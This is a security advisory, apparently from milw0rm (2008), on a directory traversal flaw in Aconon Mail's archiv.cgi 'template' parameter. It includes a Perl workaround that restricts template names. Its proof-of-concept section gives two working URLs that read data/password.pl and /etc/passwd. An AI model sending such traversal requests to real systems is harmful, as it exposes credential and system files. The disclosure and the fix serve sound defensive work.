@@ -1,0 +1,48 @@
+Application: aconon(R) Mail
+
+Affected versions: probably all known, tested against 2007 Enterprise
+SQL 11.7.0 and 2004 Enterprise SQL 11.5.1
+
+Affected plattforms: every, Aconon runs at (Win32, Linux, Solaris ...)
+
+Exploitation: remote
+
+Description: Aconon Mail is a commercial newsletter software, providing
+a feature rich web interface for both, users and administrators. This
+includes a public available archive of sent newsletters. Those archived
+e-mails may be accessed through the web browser, processed by a template
+ engine. The used template may be overwritten by any user, modifying the
+HTTP-GET "template" form parameter. This parameter is checked against
+code injection, not against directory traversal though.
+
+Proof of Concept:
+
+http://www.aconon.de/mail-demo/archiv.cgi?list=&file=Newsletter-HtmlNachricht.save&template=data/password.pl&link=%3C%3C%3C%3C
+vhttp://www.aconon.de/mail-demo/archiv.cgi?list=&file=Newsletter-HtmlNachricht.save&template=../../../../../../etc/passwd&link=%3C%3C%3C%3C
+
+Fix:
+
+No fix has been published yet. However this workaround should patch the
+issue:
+
+Add in archiv.cgi below
+  $FORM{'template'} =~ s/\|//g;
+
+this code:
+
+  use File::Basename;
+  $FORM{'template'} = ($FORM{'template'}) ? basename($FORM{'template'})
+: "";
+  if ($FORM{'template'} && $FORM{'template'} !~ /\.html$/) {
+        &error ("$TXT{'1501'}");
+        }
+
+Status: the vendor has been informed.
+
+
+German readers of the list may also read
+http://burnachurch.com/67/directory-traversal-luecke-in-aconon-mail/
+
+P.S. greets to missi - you're great :o)
+
+# milw0rm.com [2008-01-23]
